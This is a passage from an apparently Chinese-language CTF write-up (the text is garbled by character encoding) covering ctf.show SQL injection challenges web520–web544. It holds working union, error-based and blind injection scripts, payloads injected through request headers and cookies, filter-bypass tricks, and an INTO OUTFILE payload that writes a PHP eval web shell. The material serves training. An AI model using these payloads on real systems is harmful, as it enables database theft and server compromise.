    url = 'http://e1bf823f-4a25-4396-99cb-7ad61e90086d.challenge.ctf.show/'

    proxies = {
        &quot;http&quot;: &quot;http://127.0.0.1:8080&quot;
    }

    headers = {
        &quot;Content-Type&quot;:&quot;application/x-www-form-urlencoded&quot;
    }
    resp = requests.get(url=url,params=params,headers=headers,proxies=proxies)

    return resp.text

params1 = {
    &quot;id&quot;:&quot;-1\&quot;) union select 1,2,3-- &quot;
}

resp = send_request(params1)

# æŸ¥çœ‹æ‰€æœ‰æ•°æ®åº“å
params2 = {
    &quot;id&quot;:&quot;-1\&quot;) union select 1,(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA),3-- &quot;
}

resp = send_request(params2)

# æŸ¥çœ‹è¡¨å
params3 = {
    &quot;id&quot;:&quot;-1\&quot;) union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='ctfshow'),3-- &quot;
}

resp = send_request(params3)

# æŸ¥çœ‹åˆ—å
params4 = {
    &quot;id&quot;:&quot;-1\&quot;) union select 1,(select group_concat(column_name) from information_schema.columns where table_name='flagsf'),3-- &quot;
}

resp = send_request(params4)

# æŸ¥çœ‹flag
params5 = {
    &quot;id&quot;:&quot;-1\&quot;) union select 1,(select group_concat(flag23) from ctfshow.flagsf),3-- &quot;
}

resp = send_request(params5)

find_flag(resp)
</code></pre>
<h2 id="web521">web521</h2>
<p>å¸ƒå°”æ³¨å…¥ï¼Œä½¿ç”¨<code>'</code>é—­åˆ</p>
<pre><code class="language-py">import requests

url = &quot;http://6f1c2196-49fe-4141-bdbc-7120d82154b3.challenge.ctf.show/?id=1'and &quot;

result = ''
i = 0

proxies = {
    &quot;http&quot;:&quot;http://127.0.0.1:8080&quot;
}
while True:
    i = i + 1
    head = 32
    tail = 127

    while head &lt; tail:
        mid = (head + tail) &gt;&gt; 1
        # payload = f'if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&quot;ctfshow&quot;)),{i},1))&gt;{mid},1,0)%23'
        # payload = f'if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=&quot;ctfshow&quot;)),{i},1))&gt;{mid},1,0)%23'
        payload = f'if(ascii(substr((select group_concat(flag33) from ctfshow.flagpuck),{i},1))&gt;{mid},1,0)%23'

        r = requests.get(url + payload,proxies=proxies)
        if &quot;You are in...........&quot; in r.text:
            head = mid + 1
        else:
            tail = mid

    if head != 32:
        result += chr(head)
    else:
        break
    print(result)
</code></pre>
<h2 id="web522">web522</h2>
<p>å¸ƒå°”æ³¨å…¥ï¼Œä½¿ç”¨<code>&quot;</code>é—­åˆ</p>
<pre><code class="language-py">import requests

url = &quot;http://5adfc251-2ed4-4f73-8de4-287eda414c6e.challenge.ctf.show/?id=1\&quot; and &quot;

result = ''
i = 0

proxies = {
    &quot;http&quot;:&quot;http://127.0.0.1:8080&quot;
}
while True:
    i = i + 1
    head = 32
    tail = 127

    while head &lt; tail:
        mid = (head + tail) &gt;&gt; 1
        # payload = f'if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&quot;ctfshow&quot; ),{i},1))&gt;{mid},1,0)%23'
        # payload = f'if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=&quot;ctfshow&quot;),{i},1))&gt;{mid},1,0)%23'
        payload = f'if(ascii(substr((select group_concat(flag3a3) from ctfshow.flagpa),{i},1))&gt;{mid},1,0)%23'

        r = requests.get(url + payload,proxies=proxies)
        if &quot;You are in...........&quot; in r.text:
            head = mid + 1
        else:
            tail = mid

    if head != 32:
        result += chr(head)
    else:
        break
    print(result)
</code></pre>
<h2 id="web523">web523</h2>
<pre><code>?id=1%27))%20union%20select%20NULL,0x3c3f70687020406576616c28245f504f53545b315d293f3e,NULL%20into%20outfile%20&quot;/var/www/html/1.php&quot;%23
</code></pre>
<p>ä½¿ç”¨into outfileå†™å…¥shell</p>
<pre><code>&lt;?php @eval($_POST[1])?&gt;
0x3c3f70687020406576616c28245f504f53545b315d293f3e
</code></pre>
<h2 id="web524">web524</h2>
<p>æ—¶é—´ç›²æ³¨ï¼Œä½¿ç”¨<code>'</code>é—­åˆã€‚</p>
<pre><code class="language-py">import requests

url = &quot;http://c2e9c750-261e-41b2-b8eb-f2306b836355.challenge.ctf.show//?id=1%27and%20&quot;

result = ''
i = 0

proxies = {
    &quot;http&quot;:&quot;http://127.0.0.1:8080&quot;
}

while True:
    i = i + 1
    head = 32
    tail = 127

    while head &lt; tail:
        mid = (head + tail) &gt;&gt; 1
        # payload = f'if(ascii(substr((select/**/group_concat(table_name)from(information_schema.tables)where(table_schema=&quot;ctfshow&quot;)),{i},1))&gt;{mid},sleep(1.5),0)%23'
        # payload = f'if(ascii(substr((select/**/group_concat(column_name)from(information_schema.columns)where(table_schema=&quot;ctfshow&quot;)),{i},1))&gt;{mid},sleep(0.7),0)%23'
        payload = f'if(ascii(substr((select/**/group_concat(flag423)from(ctfshow.flagjugg)),{i},1))&gt;{mid},sleep(0.6),0)%23'


        try:
            r = requests.get(url + payload,proxies=proxies, timeout=0.5)
            tail = mid
        except:
            head = mid + 1


    if head != 32:
        result += chr(head)
    else:
        break
    print(result)
</code></pre>
<h2 id="web525">web525</h2>
<p>æ—¶é—´ç›²æ³¨ï¼Œä½¿ç”¨<code>'</code>é—­åˆ</p>
<pre><code class="language-py">import requests

url = &quot;http://56ab9933-1353-496e-83ee-3fc733ae8df8.challenge.ctf.show//?id=1%27and%20&quot;

result = ''
i = 0

proxies = {
    &quot;http&quot;:&quot;http://127.0.0.1:8080&quot;
}

while True:
    i = i + 1
    head = 32
    tail = 127

    while head &lt; tail:
        mid = (head + tail) &gt;&gt; 1
        # payload = f'if(ascii(substr((select/**/group_concat(table_name)from(information_schema.tables)where(table_schema=&quot;ctfshow&quot;)),{i},1))&gt;{mid},sleep(1.5),0)%23'
        # payload = f'if(ascii(substr((select/**/group_concat(column_name)from(information_schema.columns)where(table_schema=&quot;ctfshow&quot;)),{i},1))&gt;{mid},sleep(0.7),0)%23'
        payload = f'if(ascii(substr((select/**/group_concat(flag4a23)from(ctfshow.flagug)),{i},1))&gt;{mid},sleep(0.6),0)%23'


        try:
            r = requests.get(url + payload,proxies=proxies, timeout=0.5)
            tail = mid
        except:
            head = mid + 1


    if head != 32:
        result += chr(head)
    else:
        break
    print(result)
</code></pre>
<h2 id="web526">web526</h2>
<p>æ—¶é—´ç›²æ³¨ï¼Œä½¿ç”¨<code>&quot;</code>é—­åˆã€‚</p>
<pre><code class="language-py">import requests

url = &quot;http://f2b55919-bcd4-4a5f-bec2-d835aee7be4a.challenge.ctf.show/?id=1\&quot;and%20&quot;

result = ''
i = 7

while True:
    i = i + 1
    head = 32
    tail = 127

    while head &lt; tail:
        mid = (head + tail) &gt;&gt; 1
        # payload = f'if(ascii(substr((select/**/group_concat(table_name)from(information_schema.tables)where(table_schema=&quot;ctfshow&quot;)),{i},1))&gt;{mid},sleep(1.1),0)%23'
        payload = f'if(ascii(substr((select/**/group_concat(column_name)from(information_schema.columns)where(table_schema=&quot;ctfshow&quot;)),{i},1))&gt;{mid},sleep(1.1),0)%23'
        payload = f'if(ascii(substr((select/**/group_concat(flag43s)from(ctfshow.flagugs)),{i},1))&gt;{mid},sleep(1.1),0)%23'

        try:
            r = requests.get(url + payload,timeout=1)
            tail = mid
        except:
            head = mid + 1


    if head != 32:
        result += chr(head)
    else:
        break
    print(result)
</code></pre>
<h2 id="web527">web527</h2>
<p><code>'</code>é—­åˆ</p>
<pre><code>passwd=1&amp;uname=-1'union select 1,group_concat(table_name) from information_schema.tables where table_schema=&quot;ctfshow&quot;#
</code></pre>
<pre><code>passwd=1&amp;uname=-1'union select 1,group_concat(column_name) from information_schema.columns where table_schema=&quot;ctfshow&quot;#
</code></pre>
<pre><code>passwd=1&amp;uname=-1'union select 1,group_concat(flag43s) from ctfshow.flagugsd#
</code></pre>
<h2 id="web528">web528</h2>
<p><code>&quot;)</code>é—­åˆ</p>
<pre><code>passwd=1&amp;uname=-1&quot;)union select 1,group_concat(table_name) from information_schema.tables where table_schema=&quot;ctfshow&quot;#
</code></pre>
<pre><code>passwd=1&amp;uname=-1&quot;)union select 1,group_concat(column_name) from information_schema.columns where table_schema=&quot;ctfshow&quot;#
</code></pre>
<pre><code>passwd=1&amp;uname=-1&quot;)union select 1,group_concat(flag43as
) from ctfshow.flagugsds#
</code></pre>
<h2 id="web529">web529</h2>
<p><code>')</code>é—­åˆ<br>
æ²¡æœ‰å›æ˜¾ï¼Œä½¿ç”¨æŠ¥é”™æ³¨å…¥<code>updatexml</code></p>
<pre><code>passwd=1&amp;uname=-1') and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&quot;ctfshow&quot;)),0)#
</code></pre>
<pre><code>passwd=1&amp;uname=-1') and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=&quot;ctfshow&quot;)),0)#
</code></pre>
<pre><code>passwd=1&amp;uname=-1') and updatexml(1,concat(0x7e,(select flag4 from ctfshow.flag)),0)#
passwd=1&amp;uname=-1') and updatexml(1,concat(0x7e,(select right(flag4,20) from ctfshow.flag)),0)#
</code></pre>
<h2 id="web530">web530</h2>
<p><code>&quot;</code>é—­åˆ<br>
æ²¡æœ‰å›æ˜¾ï¼Œä½¿ç”¨æŠ¥é”™æ³¨å…¥<code>updatexml</code></p>
<pre><code>passwd=1&amp;uname=-1&quot; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&quot;ctfshow&quot;)),0)#
</code></pre>
<pre><code>passwd=1&amp;uname=-1&quot; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=&quot;ctfshow&quot;)),0)#
</code></pre>
<pre><code>passwd=1&amp;uname=-1&quot; and updatexml(1,concat(0x7e,(select flag4s from ctfshow.flagb)),0)#
passwd=1&amp;uname=-1&quot; and updatexml(1,concat(0x7e,(select right(flag4s,20) from ctfshow.flagb)),0)#
</code></pre>
<h2 id="web531">web531</h2>
<p><code>'</code>é—­åˆ<br>
æ²¡æœ‰å›æ˜¾åŠæŠ¥é”™ä¿¡æ¯ï¼Œä½¿ç”¨å¸ƒå°”ç›²æ³¨ã€‚</p>
<pre><code class="language-py">import requests

url = &quot;http://da743c68-9836-40dd-af7d-2260c9256357.challenge.ctf.show/&quot;

result = ''
i = 0

proxy = {
    &quot;http&quot;:&quot;http://127.0.0.1:8080&quot;
}
while True:
    i = i + 1
    head = 32
    tail = 127

    while head &lt; tail:
        mid = (head + tail) &gt;&gt; 1
        # payload ={
        #     &quot;uname&quot;:f&quot;-1' or if(ascii(substr((select group_concat(schema_name) from information_schema.schemata),{i},1))&gt;{mid},1,0)#&quot;,
        #     &quot;passwd&quot;:&quot;123&quot;,
        #     &quot;submit&quot;:&quot;Submit&quot;
        # }
        # payload ={
        #     &quot;uname&quot;:f&quot;-1' or if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema='ctfshow'),{i},1))&gt;{mid},1,0)#&quot;,
        #     &quot;passwd&quot;:&quot;123&quot;,
        #     &quot;submit&quot;:&quot;Submit&quot;
        # }
        # payload ={
        #     &quot;uname&quot;:f&quot;-1' or if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema='ctfshow'),{i},1))&gt;{mid},1,0)#&quot;,
        #     &quot;passwd&quot;:&quot;123&quot;,
        #     &quot;submit&quot;:&quot;Submit&quot;
        # }
        payload ={
            &quot;uname&quot;:f&quot;-1' or if(ascii(substr((select group_concat(flag4sa) from ctfshow.flagba),{i},1))&gt;{mid},1,0)#&quot;,
            &quot;passwd&quot;:&quot;123&quot;,
            &quot;submit&quot;:&quot;Submit&quot;
        }
        # payload = 

        r = requests.post(url=url, data=payload,proxies=proxy)
        if 'flag.jpg' in r.text:
            head = mid + 1
        else:
            tail = mid
    if head != 32:
        result += chr(head)
    else:
        break
    print(result)
</code></pre>
<h2 id="web532">web532</h2>
<p><code>&quot;)</code>é—­åˆ<br>
æ²¡æœ‰å›æ˜¾åŠæŠ¥é”™ä¿¡æ¯ï¼Œä½¿ç”¨å¸ƒå°”ç›²æ³¨ã€‚</p>
<pre><code class="language-py">import requests

url = &quot;http://7e9bdf22-362a-4365-81e7-804e55517648.challenge.ctf.show/&quot;

result = ''
i = 0

proxy = {
    &quot;http&quot;:&quot;http://127.0.0.1:8080&quot;
}
while True:
    i = i + 1
    head = 32
    tail = 127

    while head &lt; tail:
        mid = (head + tail) &gt;&gt; 1
        # payload ={
        #     &quot;uname&quot;:f&quot;-1\&quot;) or if(ascii(substr((select group_concat(schema_name) from information_schema.schemata),{i},1))&gt;{mid},1,0)#&quot;,
        #     &quot;passwd&quot;:&quot;123&quot;,
        #     &quot;submit&quot;:&quot;Submit&quot;
        # }
        # payload ={
        #     &quot;uname&quot;:f&quot;-1\&quot;) or if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema='ctfshow'),{i},1))&gt;{mid},1,0)#&quot;,
        #     &quot;passwd&quot;:&quot;123&quot;,
        #     &quot;submit&quot;:&quot;Submit&quot;
        # }
        # payload ={
        #     &quot;uname&quot;:f&quot;-1\&quot;) or if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema='ctfshow'),{i},1))&gt;{mid},1,0)#&quot;,
        #     &quot;passwd&quot;:&quot;123&quot;,
        #     &quot;submit&quot;:&quot;Submit&quot;
        # }
        payload ={
            &quot;uname&quot;:f&quot;-1\&quot;) or if(ascii(substr((select group_concat(flag4sa) from ctfshow.flagbab),{i},1))&gt;{mid},1,0)#&quot;,
            &quot;passwd&quot;:&quot;123&quot;,
            &quot;submit&quot;:&quot;Submit&quot;
        }
        # payload = 

        r = requests.post(url=url, data=payload,proxies=proxy)
        if 'flag.jpg' in r.text:
            head = mid + 1
        else:
            tail = mid
    if head != 32:
        result += chr(head)
    else:
        break
    print(result)
</code></pre>
<h2 id="web533">web533</h2>
<p><code>'</code>é—­åˆï¼Œupdateå‹æŠ¥é”™æ³¨å…¥</p>
<pre><code>uname=admin&amp;passwd=123' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='ctfshow'),0x7e),1)#
</code></pre>
<pre><code>uname=admin&amp;passwd=123' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='ctfshow'),0x7e),1)#
</code></pre>
<pre><code>uname=admin&amp;passwd=123' and updatexml(1,concat(0x7e,(select flag4 from ctfshow.flag),0x7e),1)#
</code></pre>
<pre><code>uname=admin&amp;passwd=123' and updatexml(1,concat(0x7e,right((select flag4 from ctfshow.flag),20),0x7e),1)#
</code></pre>
<h2 id="web534">web534</h2>
<p>ä½¿ç”¨è´¦å·admin/adminç™»å½•ï¼Œä¼šæ˜¾ç¤ºUAå¤´åŠIP Refereråœ°å€<br>
UAå¤´æ³¨å…¥<br>
è¿™é‡Œæ— æ³•ä½¿ç”¨æ³¨é‡Šç¬¦ï¼Œä½¿ç”¨å¼•å·é—­åˆåé¢çš„å¼•å·ã€‚</p>
<p>åç«¯æºç ï¼š</p>
<pre><code class="language-php">&lt;?php
 $insert=&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)&quot;;
mysql_query($insert);
print_r(mysql_error());	
</code></pre>
<pre><code>User-Agent: 'and updatexml(1,concat(0x3d,(select group_concat(schema_name) from information_schema.schemata)),1) and'
</code></pre>
<pre><code>User-Agent: 'and updatexml(1,concat(0x3d,(select group_concat(table_name) from information_schema.tables where table_schema=&quot;ctfshow&quot;)),1) and'
</code></pre>
<pre><code>User-Agent: 'and updatexml(1,concat(0x3d,(select group_concat(column_name) from information_schema.columns where table_schema=&quot;ctfshow&quot;)),1) and'
</code></pre>
<pre><code>User-Agent: 'and updatexml(1,concat(0x3d,(select group_concat(flag4) from ctfshow.flag)),1) and'
</code></pre>
<pre><code>User-Agent: 'and updatexml(1,concat(0x3d,(select right(flag4,20) from ctfshow.flag)),1) and'
</code></pre>
<h2 id="web535">web535</h2>
<p>ä½¿ç”¨è´¦å·admin/adminç™»å½•ï¼Œä¼šæ˜¾ç¤ºIP Refereråœ°å€<br>
Refererå¤´æ³¨å…¥<br>
è¿™é‡Œæ— æ³•ä½¿ç”¨æ³¨é‡Šç¬¦ï¼Œä½¿ç”¨å¼•å·é—­åˆåé¢çš„å¼•å·ã€‚</p>
<p>åç«¯æºç ï¼š</p>
<pre><code class="language-php">&lt;?php
$uagent = $_SERVER['HTTP_REFERER'];
$IP = $_SERVER['REMOTE_ADDR'];
$insert=&quot;INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES ('$uagent', '$IP')&quot;;
mysql_query($insert);
print_r(mysql_error());
</code></pre>
<pre><code>Referer: 'and updatexml(1,concat(0x3d,(select group_concat(schema_name) from information_schema.schemata)),1) and'
</code></pre>
<pre><code>Referer: 'and updatexml(1,concat(0x3d,(select group_concat(table_name) from information_schema.tables where table_schema=&quot;ctfshow&quot;)),1) and'
</code></pre>
<pre><code>Referer: 'and updatexml(1,concat(0x3d,(select group_concat(column_name) from information_schema.columns where table_schema=&quot;ctfshow&quot;)),1) and'
</code></pre>
<pre><code>Referer: 'and updatexml(1,concat(0x3d,(select group_concat(flag4) from ctfshow.flag)),1) and'
</code></pre>
<pre><code>Referer: 'and updatexml(1,concat(0x3d,(select right(flag4,20) from ctfshow.flag)),1) and'
</code></pre>
<h2 id="web536">web536</h2>
<p>ä½¿ç”¨è´¦å·admin/adminç™»å½•ï¼Œä¼šæ˜¾ç¤ºCookieå€¼<br>
Cookieå¤´æ³¨å…¥</p>
<p>åå°æºç ï¼š</p>
<pre><code class="language-php">&lt;?php
$sql=&quot;SELECT * FROM users WHERE username='$cookee' LIMIT 0,1&quot;;
			$result=mysql_query($sql);
			if (!$result)
  				{
  				die('Issue with your mysql: ' . mysql_error());
  				}
</code></pre>
<pre><code>Cookie: uname='and updatexml(1,concat(0x3d,(select group_concat(schema_name) from information_schema.schemata)),1)#
</code></pre>
<pre><code>Cookie:uname='and updatexml(1,concat(0x3d,(select group_concat(table_name) from information_schema.tables where table_schema=&quot;ctfshow&quot;)),1)#
</code></pre>
<pre><code>Cookie:uname='and updatexml(1,concat(0x3d,(select group_concat(column_name) from information_schema.columns where table_schema=&quot;ctfshow&quot;)),1)#
</code></pre>
<pre><code>Cookie:uname='and updatexml(1,concat(0x3d,(select group_concat(flag4) from ctfshow.flag)),1)#
</code></pre>
<pre><code>Cookie:uname='and updatexml(1,concat(0x3d,(select right(flag4,20) from ctfshow.flag)),1)#
</code></pre>
<h2 id="web537">web537</h2>
<p><code>')</code>é—­åˆ<br>
ä½¿ç”¨è´¦å·admin/adminç™»å½•ï¼Œä¼šæ˜¾ç¤ºbase64ç¼–ç çš„Cookieå€¼<br>
Cookieå¤´æ³¨å…¥</p>
<p>åç«¯æºç ï¼š</p>
<pre><code class="language-php">&lt;?php&gt;
$cookee = base64_decode($cookee);
echo &quot;&lt;br&gt;&lt;/font&gt;&quot;;
$sql=&quot;SELECT * FROM users WHERE username=('$cookee') LIMIT 0,1&quot;;
$result=mysql_query($sql);
if (!$result)
    {
    die('Issue with your mysql: ' . mysql_error());
    }

</code></pre>
<pre><code>Cookie: uname=JylhbmQgdXBkYXRleG1sKDEsY29uY2F0KDB4M2QsKHNlbGVjdCBncm91cF9jb25jYXQoc2NoZW1hX25hbWUpIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLnNjaGVtYXRhKSksMSkj
</code></pre>
<pre><code>Cookie:uname=JylhbmQgdXBkYXRleG1sKDEsY29uY2F0KDB4M2QsKHNlbGVjdCBncm91cF9jb25jYXQodGFibGVfbmFtZSkgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIHdoZXJlIHRhYmxlX3NjaGVtYT0iY3Rmc2hvdyIpKSwxKSM=
</code></pre>
<pre><code>Cookie:uname=JylhbmQgdXBkYXRleG1sKDEsY29uY2F0KDB4M2QsKHNlbGVjdCBncm91cF9jb25jYXQoY29sdW1uX25hbWUpIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLmNvbHVtbnMgd2hlcmUgdGFibGVfc2NoZW1hPSJjdGZzaG93IikpLDEpIw==
</code></pre>
<pre><code>Cookie:uname=JylhbmQgdXBkYXRleG1sKDEsY29uY2F0KDB4M2QsKHNlbGVjdCBncm91cF9jb25jYXQoZmxhZzQpIGZyb20gY3Rmc2hvdy5mbGFnKSksMSkj
</code></pre>
<pre><code>Cookie:uname=JylhbmQgdXBkYXRleG1sKDEsY29uY2F0KDB4M2QsKHNlbGVjdCByaWdodChmbGFnNCwyMCkgZnJvbSBjdGZzaG93LmZsYWcpKSwxKSM=
</code></pre>
<h2 id="web538">web538</h2>
<p><code>&quot;</code>é—­åˆï¼Œå…¶ä»–å’Œä¸Šé¢˜ç›¸åŒ</p>
<pre><code>Cookie: uname=ImFuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHgzZCwoc2VsZWN0IHJpZ2h0KGZsYWc0LDIwKSBmcm9tIGN0ZnNob3cuZmxhZykpLDEpIw==
</code></pre>
<pre><code>Cookie: uname=ImFuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHgzZCwoc2VsZWN0IGdyb3VwX2NvbmNhdChmbGFnNCkgZnJvbSBjdGZzaG93LmZsYWcpKSwxKSM=
</code></pre>
<h2 id="web539">web539</h2>
<p>è¿‡æ»¤äº†æ³¨é‡Šç¬¦çš„æŠ¥é”™æ³¨å…¥ã€‚</p>
<p>åç«¯æºç ï¼š</p>
<pre><code class="language-php">&lt;?php
$reg = &quot;/#/&quot;;
$reg1 = &quot;/--/&quot;;
$replace = &quot;&quot;;
$id = preg_replace($reg, $replace, $id);
$id = preg_replace($reg1, $replace, $id)

$sql=&quot;SELECT * FROM users WHERE id='$id' LIMIT 0,1&quot;;
$result=mysql_query($sql);
$row = mysql_fetch_array($result);

	if($row)
	{
  	echo '&lt;font color= &quot;#0000ff&quot;&gt;';	
  	echo 'Your Login name:'. $row['username'];
  	echo &quot;&lt;br&gt;&quot;;
  	echo 'Your Password:' .$row['password'];
  	echo &quot;&lt;/font&gt;&quot;;
  	}
	else 
	{
	echo '&lt;font color= &quot;#FFFF00&quot;&gt;';
	print_r(mysql_error());
	echo &quot;&lt;/font&gt;&quot;;  
	}
}
</code></pre>
<pre><code>id='and updatexml(1,concat(0x3d,(select group_concat(schema_name) from information_schema.schemata)),1) and'
</code></pre>
<pre><code>id='and updatexml(1,concat(0x3d,(select group_concat(table_name) from information_schema.tables where table_schema=&quot;ctfshow&quot;)),1) and'
</code></pre>
<pre><code>id='and updatexml(1,concat(0x3d,(select group_concat(column_name) from information_schema.columns where table_schema=&quot;ctfshow&quot;)),1) and'
</code></pre>
<pre><code>id='and updatexml(1,concat(0x3d,(select group_concat(flag4) from ctfshow.flag)),1) and'
</code></pre>
<pre><code>id='and updatexml(1,concat(0x3d,(select right(flag4,20) from ctfshow.flag)),1) and'
</code></pre>
<h2 id="web540">web540</h2>
<p>åå°æºç :<br>
pass_change.php</p>
<pre><code class="language-php">&lt;?php
# Validating the user input........
	$username= $_SESSION[&quot;username&quot;];
	$curr_pass= mysql_real_escape_string($_POST['current_password']);
	$pass= mysql_real_escape_string($_POST['password']);
	$re_pass= mysql_real_escape_string($_POST['re_password']);
	
	if($pass==$re_pass)
	{	
		$sql = &quot;UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' &quot;;
		$res = mysql_query($sql) or die('You tried to be smart, Try harder!!!! :( ');
		$row = mysql_affected_rows();
		echo '&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;';
		echo '&lt;center&gt;';
		if($row==1)
		{
			echo &quot;Password successfully updated&quot;;
	
		}
		else
		{
			header('Location: failed.php');
			//echo 'You tried to be smart, Try harder!!!! :( ';
		}
	}
</code></pre>
<p>å¯ä»¥çœ‹åˆ°åªæœ‰<code>$_SESSION[&quot;username&quot;]</code>æ²¡æœ‰è¢«è¿‡æ»¤ï¼Œæˆ‘ä»¬æ³¨å†Œè´¦å·å¯ä»¥æ§åˆ¶å€¼ï¼ŒäºŒæ¬¡æ³¨å…¥ã€‚</p>
<p>ä½¿ç”¨æ—¶é—´ç›²æ³¨ï¼Œç¼–å†™è„šæœ¬ï¼ˆcopy from Y4ï¼‰</p>
<pre><code class="language-py">import requests
session = requests.session()

result = ''
i = 0

while True:
    i = i + 1
    head = 32
    tail = 127

    while head &lt; tail:
        mid = (head + tail) &gt;&gt; 1
        # payload = f'if(ascii(substr((select/**/group_concat(table_name)from(information_schema.tables)where(table_schema=&quot;ctfshow&quot;)),{i},1))&gt;{mid},sleep(1),0)'
        # payload = f'if(ascii(substr((select/**/group_concat(column_name)from(information_schema.columns)where(table_schema=&quot;ctfshow&quot;)),{i},1))&gt;{mid},sleep(0.7),0)'
        payload = f'if(ascii(substr((select/**/group_concat(flag4)from(ctfshow.flag)),{i},1))&gt;{mid},sleep(0.6),0)'
        username = f&quot;admin' and {payload} or '1'='1&quot;
        url1 = 'http://88168b56-d788-46e8-be60-ead77e054e6f.challenge.ctf.show/login_create.php'
        data = {
            'username': username,
            'password': '1',
            're_password': '1',
            'submit': 'Register'
        }
        r = session.post(url1, data=data)
        url2 = 'http://88168b56-d788-46e8-be60-ead77e054e6f.challenge.ctf.show/login.php'
        data = {
            'login_user': username,
            'login_password': '1',
            'mysubmit': 'Login',
        }
        r = session.post(url2, data=data)
        url3 = 'http://88168b56-d788-46e8-be60-ead77e054e6f.challenge.ctf.show/pass_change.php'
        data = {
            'current_password': '1',
            'password': '2',
            're_password': '2',
            'submit': 'Reset'
        }

        try:
            r = session.post(url3,data=data,timeout=0.5)
            tail = mid
        except:
            head = mid + 1


    if head != 32:
        result += chr(head)
    else:
        break
    print(result)
</code></pre>
<h2 id="web541">web541</h2>
<p>è¿‡æ»¤äº†<code>or</code>å’Œ<code>and</code><br>
ä½¿ç”¨é‡å†™ç»•è¿‡</p>
<pre><code>%27aandnd%20updatexml(1,concat(0x3d,(select%20group_concat(schema_name)%20from%20infoorrmation_schema.schemata)),1)--+
</code></pre>
<pre><code>%27aandnd%20updatexml(1,concat(0x3d,(select%20group_concat(table_name)%20from%20infoorrmation_schema.tables where table_schema=&quot;ctfshow&quot;)),1)--+
</code></pre>
<pre><code>%27aandnd%20updatexml(1,concat(0x3d,(select%20group_concat(column_name)%20from%20infoorrmation_schema.columns where table_schema=&quot;ctfshow&quot;)),1)--+
</code></pre>
<pre><code>%27aandnd%20updatexml(1,concat(0x3d,(select%20flag4s%20from%20ctfshow.flags)),1)--+
</code></pre>
<pre><code>%27aandnd%20updatexml(1,concat(0x3d,(select%20right(flag4s,20)%20from%20ctfshow.flags)),1)--+
</code></pre>
<h2 id="web542">web542</h2>
<p>ä¸èƒ½ä½¿ç”¨æŠ¥é”™æ³¨å…¥ï¼Œä½†æ˜¯æœ‰å›æ˜¾ï¼Œä½¿ç”¨unionæ³¨å…¥ã€‚<br>
è¿˜æ˜¯åŒæ ·çš„åŒå†™ç»•è¿‡è¿‡æ»¤ã€‚</p>
<pre><code>-1%20union%20select%201,2,group_concat(table_name)%20from%20infoorrmation_schema.tables where table_schema='ctfshow'%23
</code></pre>
<pre><code>-1%20union%20select%201,2,group_concat(column_name)%20from%20infoorrmation_schema.columns where table_schema='ctfshow'%23
</code></pre>
<pre><code>-1%20union%20select%201,2,group_concat(flag4s)%20from%20ctfshow.flags%23
</code></pre>
<h2 id="web543">web543</h2>
<p>è¿‡æ»¤äº†ç©ºæ ¼å’Œæ³¨é‡Šç¬¦</p>
<p>ç»•è¿‡ç©ºæ ¼æ–¹å¼ï¼š</p>
<pre><code>%09 TAB é”®ï¼ˆæ°´å¹³ï¼‰
%0a æ–°å»ºä¸€è¡Œ
%0c æ–°çš„ä¸€é¡µ
%0d return åŠŸèƒ½
%0b TAB é”®ï¼ˆå‚ç›´ï¼‰
%a0 ç©ºæ ¼
</code></pre>
<p>è¿™é‡Œç”¨æ‹¬å·çš„æ–¹å¼ï¼Œå’Œ<code>||</code>ä»£æ›¿oræ¥ç»•è¿‡ã€‚</p>
<p>æ³¨é‡Šç¬¦éƒ½è¢«è¿‡æ»¤æ‰äº†ï¼Œæœ€åçš„å¼•å·æˆ‘ä»¬éœ€è¦é—­åˆã€‚</p>
<pre><code>999%27||updatexml(1,concat(0x7e,(select((flag4s))from(ctfshow.flags)),0x7e),1)||%27
</code></pre>
<pre><code>999%27||updatexml(1,concat(0x7e,(select(right(flag4s,20))from(ctfshow.flags)),0x7e),1)||%27
</code></pre>
<h2 id="web544">web544</h2>
<p><code>')</code>é—­åˆ<br>
æ²¡æœ‰æŠ¥é”™ä¿¡æ¯<br>
ä½¿ç”¨ä¸Šé¢˜æ–¹æ³•ï¼Œæ”¹ä¸ºå¸ƒå°”ç›²æ³¨ã€‚</p>
<pre><code class="language-py">import requests

url = &quot;http://6ec46794-6350-449e-8a3b-361aac041abf.challenge.ctf.show/&quot;

result = ''
i = 0

while True:
    i = i + 1
    head = 32
    tail = 127

    while head &lt; tail:
        mid = (head + tail) &gt;&gt; 1
        # payload = f'if(ascii(substr((select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=&quot;ctfshow&quot;)),{i},1))&gt;{mid},1,0)'
        # payload = f'if(ascii(substr((select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_schema=&quot;ctfshow&quot;)),{i},1))&gt;{mid},1,0)'
        payload = f'if(ascii(substr((select(group_concat(flag4s))from(ctfshow.flags)),{i},1))&gt;{mid},1,0)'
        data = {
            'id': f&quot;999')||{payload}||('0&quot;
        }
        r = requests.get(url,params=data)
        if &quot;Dumb&quot; in r.text:
            head = mid + 1
        else:
            tail = mid

    if head != 32:
        result += chr(head)
    else:
